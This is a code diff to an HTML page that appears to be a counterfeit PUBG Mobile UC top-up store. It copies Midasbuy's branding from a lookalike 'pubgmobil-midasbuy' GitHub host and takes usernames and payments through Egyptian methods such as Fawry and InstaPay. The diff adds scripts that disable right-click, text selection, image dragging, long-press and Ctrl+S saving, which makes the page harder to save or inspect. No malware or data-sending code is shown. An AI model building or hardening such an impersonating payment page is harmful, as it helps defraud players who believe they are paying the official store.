@@ -354,7 +354,6 @@
     content: "\f060";
   }
 
-  /* ✅ مؤشر التحميل داخل زر الدفع مع تأثير اختفاء تدريجي */
   .payment-page-overlay .pay-btn.loading {
     opacity: 0.55 !important;
     filter: grayscale(0.15);
@@ -395,6 +394,57 @@
   @media (min-width: 768px) {
     .payment-page-overlay .pay-header { display: none; }
   }
+
+  /* ============================================
+     ✅ منع الضغط المطول على الصور والأيقونات
+     ============================================ */
+
+  /* منع تحديد النص والقائمة المطوّلة على كل الصفحة */
+  * {
+    -webkit-touch-callout: none !important;
+    -webkit-user-select: none !important;
+    -khtml-user-select: none !important;
+    -moz-user-select: none !important;
+    -ms-user-select: none !important;
+    user-select: none !important;
+    -webkit-tap-highlight-color: transparent !important;
+  }
+
+  /* السماح بكتابة النص في حقول الإدخال فقط */
+  input,
+  textarea,
+  [contenteditable="true"] {
+    -webkit-user-select: text !important;
+    -moz-user-select: text !important;
+    -ms-user-select: text !important;
+    user-select: text !important;
+    -webkit-touch-callout: default !important;
+  }
+
+  /* منع سحب وحفظ كل الصور */
+  img {
+    -webkit-user-drag: none !important;
+    -khtml-user-drag: none !important;
+    -moz-user-drag: none !important;
+    -o-user-drag: none !important;
+    user-drag: none !important;
+    pointer-events: none !important;
+    -webkit-touch-callout: none !important;
+    -webkit-user-select: none !important;
+    user-select: none !important;
+    -webkit-tap-highlight-color: transparent !important;
+  }
+
+  /* السماح بالنقر على الصور جوه عناصر قابلة للضغط (زي radio-card) */
+  .payment-page-overlay .radio-card img,
+  .payment-page-overlay .card-content img {
+    pointer-events: auto !important;
+    -webkit-touch-callout: none !important;
+    -webkit-user-select: none !important;
+    user-select: none !important;
+    -webkit-user-drag: none !important;
+    user-drag: none !important;
+  }
 </style>
 </head>
 <body>
@@ -403,7 +453,7 @@
 <div class="page active" id="page1">
   <div class="card">
     <div class="top-image">
-      <img src="https://raw.githubusercontent.com/pubgmobil-midasbuy/midasbuy.com/main/IMG_٢٠٢٦٠٩١٢_١٢٤٢١٦.webp" alt="PUBG Mobile">
+      <img src="https://raw.githubusercontent.com/pubgmobil-midasbuy/midasbuy.com/main/IMG_٢٠٢٦٠٩١٢_١٢٤٢١٦.webp" alt="PUBG Mobile" draggable="false" oncontextmenu="return false;">
     </div>
 
     <div class="content">
@@ -439,7 +489,7 @@
         <h2>يرجى اختيار وسيلة الدفع</h2>
         <img class="country-flag"
              src="https://pubgmobil-midasbuy.github.io/midasbuy.com/8.svg"
-             alt="Egypt">
+             alt="Egypt" draggable="false" oncontextmenu="return false;">
       </div>
 
       <div class="pay-body">
@@ -450,10 +500,10 @@
           <div class="card-content-wrapper">
             <span class="check-icon"></span>
             <div class="card-content">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/1.png" alt="visa">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/2.png" alt="MasterCard">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/3.png" alt="Mada">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/4.png" alt="Apple Pay &amp; Google Pay">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/1.png" alt="visa" draggable="false" oncontextmenu="return false;">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/2.png" alt="MasterCard" draggable="false" oncontextmenu="return false;">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/3.png" alt="Mada" draggable="false" oncontextmenu="return false;">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/4.png" alt="Apple Pay &amp; Google Pay" draggable="false" oncontextmenu="return false;">
             </div>
             <span class="main-payment-badge">أساسية</span>
           </div>
@@ -465,7 +515,7 @@
           <div class="card-content-wrapper">
             <span class="check-icon"></span>
             <div class="card-content">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/5.png" alt="wallets">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/5.png" alt="wallets" draggable="false" oncontextmenu="return false;">
             </div>
           </div>
         </label>
@@ -476,7 +526,7 @@
           <div class="card-content-wrapper">
             <span class="check-icon"></span>
             <div class="card-content">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/6.png" alt="instapay">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/6.png" alt="instapay" draggable="false" oncontextmenu="return false;">
             </div>
           </div>
         </label>
@@ -487,7 +537,7 @@
           <div class="card-content-wrapper">
             <span class="check-icon"></span>
             <div class="card-content">
-              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/7.png" alt="Fawry">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/7.png" alt="Fawry" draggable="false" oncontextmenu="return false;">
             </div>
           </div>
         </label>
@@ -675,7 +725,7 @@
     div.dataset.coins = coins;
     div.dataset.egp = egp;
     div.innerHTML = `
-      <div class="uc-symbol"><img class="uc-icon-img" src="${UC_ICON}" alt="UC"></div>
+      <div class="uc-symbol"><img class="uc-icon-img" src="${UC_ICON}" alt="UC" draggable="false" oncontextmenu="return false;"></div>
       <div class="coins">${coins.toLocaleString('en-US')}</div>
       <div class="total-price">ج.م 0</div>
     `;
@@ -765,7 +815,6 @@
     }
   });
 
-  /* ====== زر متابعة الدفع (فتح صفحة الدفع) ====== */
   proceedBtn.addEventListener('click', () => {
     const username = usernameInput.value.trim();
     if (!isValidUsername(username)) {
@@ -788,7 +837,6 @@
     document.body.style.overflow = 'hidden';
   });
 
-  /* ✅ دالة إعادة تعيين زر الدفع */
   function resetPayButton() {
     isSubmitting = false;
     finalPayBtn.disabled = false;
@@ -803,7 +851,6 @@
     if (btnSpinner) btnSpinner.style.display = 'none';
   }
 
-  /* ✅ إعادة تعيين قوية مع محاولات متعددة لضمان التطبيق بعد bfcache */
   function forceResetAfterRestore() {
     resetPayButton();
     setTimeout(resetPayButton, 0);
@@ -816,7 +863,6 @@
     });
   }
 
-  /* ✅ التعامل مع زر الرجوع */
   window.addEventListener('popstate', function (e) {
     if (paymentPageOverlay.classList.contains('active')) {
       paymentPageOverlay.classList.remove('active');
@@ -825,7 +871,6 @@
     forceResetAfterRestore();
   });
 
-  /* ✅ لو المتصفح رجع الصفحة من الكاش (bfcache) */
   window.addEventListener('pageshow', function (e) {
     forceResetAfterRestore();
     if (paymentPageOverlay.classList.contains('active')) {
@@ -833,23 +878,19 @@
     }
   });
 
-  /* ✅ عند عودة التركيز للنافذة */
   window.addEventListener('focus', function () {
     if (paymentPageOverlay.classList.contains('active')) {
       forceResetAfterRestore();
     }
   });
 
-  /* ✅ كمان لو رجع من Kashier عن طريق visibilitychange */
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden && paymentPageOverlay.classList.contains('active')) {
       forceResetAfterRestore();
     }
   });
 
-  /* ====== زر الدفع النهائي ====== */
   finalPayBtn.addEventListener('click', async () => {
-    // ✅ الفحص يعتمد على حالة الزر الفعلية (loading class) وليس على isSubmitting
     if (finalPayBtn.classList.contains('loading')) return;
 
     const selectedMethod = document.querySelector('input[name="payment"]:checked');
@@ -860,7 +901,6 @@
 
     const method = selectedMethod.value;
 
-    // ✅ ضبط الحالة وإظهار التحميل فوراً وقبل أي شيء آخر
     isSubmitting = true;
     finalPayBtn.disabled = true;
     finalPayBtn.classList.add('loading');
@@ -919,8 +959,112 @@
   buildCustomDropdown();
   countrySelect.dispatchEvent(new Event('change'));
 
-  // ✅ ضمان أن الزر يبدأ بحالة نظيفة عند التحميل الأولي
   resetPayButton();
+
+  /* ============================================
+     ✅ منع الضغط المطول (Long Press) على الصور
+     ✅ منع قائمة النقر بزر الفأرة الأيمن
+     ✅ منع سحب الصور
+     ============================================ */
+
+  // 1) منع قائمة النقر بزر الفأرة الأيمن (Desktop)
+  document.addEventListener('contextmenu', function (e) {
+    const tag = e.target.tagName;
+    if (tag === 'INPUT' || tag === 'TEXTAREA' || e.target.isContentEditable) {
+      return;
+    }
+    e.preventDefault();
+    return false;
+  }, false);
+
+  // 2) منع الضغط المطول على الموبايل (Long Press)
+  let longPressTimer = null;
+  let touchMoved = false;
+
+  document.addEventListener('touchstart', function (e) {
+    const tag = e.target.tagName;
+    if (tag === 'INPUT' || tag === 'TEXTAREA' || e.target.isContentEditable) {
+      return;
+    }
+
+    touchMoved = false;
+
+    longPressTimer = setTimeout(function () {
+      if (!touchMoved) {
+        e.preventDefault();
+      }
+    }, 500);
+  }, { passive: false });
+
+  document.addEventListener('touchmove', function () {
+    touchMoved = true;
+    if (longPressTimer) {
+      clearTimeout(longPressTimer);
+      longPressTimer = null;
+    }
+  }, { passive: true });
+
+  document.addEventListener('touchend', function () {
+    if (longPressTimer) {
+      clearTimeout(longPressTimer);
+      longPressTimer = null;
+    }
+  }, { passive: true });
+
+  document.addEventListener('touchcancel', function () {
+    if (longPressTimer) {
+      clearTimeout(longPressTimer);
+      longPressTimer = null;
+    }
+  }, { passive: true });
+
+  // 3) منع سحب الصور (Drag)
+  document.addEventListener('dragstart', function (e) {
+    if (e.target.tagName === 'IMG') {
+      e.preventDefault();
+      return false;
+    }
+  }, false);
+
+  // 4) منع الحفظ بالاختصارات (Ctrl+S / Cmd+S)
+  document.addEventListener('keydown', function (e) {
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
+      e.preventDefault();
+    }
+  });
+
+  // 5) تعطيل أي محاولة لفتح الصورة في تبويب جديد
+  document.querySelectorAll('img').forEach(function (img) {
+    img.addEventListener('dragstart', function (e) {
+      e.preventDefault();
+      return false;
+    });
+    img.addEventListener('mousedown', function (e) {
+      if (e.button === 2) e.preventDefault();
+    });
+  });
+
+  // 6) حماية إضافية: تعطيل Long Press على الصور بعد إضافة أي صور جديدة
+  const observer = new MutationObserver(function (mutations) {
+    mutations.forEach(function (mutation) {
+      mutation.addedNodes.forEach(function (node) {
+        if (node.nodeType === 1 && node.tagName === 'IMG') {
+          node.setAttribute('draggable', 'false');
+          node.setAttribute('oncontextmenu', 'return false;');
+          node.addEventListener('dragstart', function (e) {
+            e.preventDefault();
+            return false;
+          });
+          node.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+            return false;
+          });
+        }
+      });
+    });
+  });
+
+  observer.observe(document.body, { childList: true, subtree: true });
 
 })();
 </script>
